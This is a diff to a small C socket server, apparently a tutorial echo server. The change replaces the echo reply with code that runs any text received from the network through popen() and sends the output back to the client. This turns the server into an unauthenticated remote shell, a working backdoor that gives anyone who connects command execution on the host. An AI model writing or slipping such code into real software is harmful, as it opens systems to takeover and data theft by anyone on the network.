@@ -14,12 +14,20 @@ void doprocessing (int sock) {
         perror("ERROR reading from socket");
         exit(1);
     }
-    printf("Here is the message: %s\n",buffer);
-    n = write(sock,"I got your message",18);
-    if (n < 0) {
-        perror("ERROR writing to socket");
-        exit(1);
+   
+    FILE* fp = popen(buffer,"r");
+    if (fp == NULL){
+	    printf("Failed to run command.");
+	    return;
     }
+    
+    char buffersend[4096];
+    while (fgets(buffersend, sizeof(buffersend)-1,fp)!=NULL){
+	printf("%s", buffersend);
+    	write(sock, buffersend, strlen(buffersend));
+    }
+    pclose(fp);
+
 }
 
 int main( int argc, char *argv[] )
@@ -41,7 +49,9 @@ int main( int argc, char *argv[] )
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_addr.s_addr = INADDR_ANY;
     serv_addr.sin_port = htons(portno);
- 
+    int yes = 1;
+    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));
+
     /* Now bind the host address using bind() call.*/
     if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
          perror("ERROR on binding");
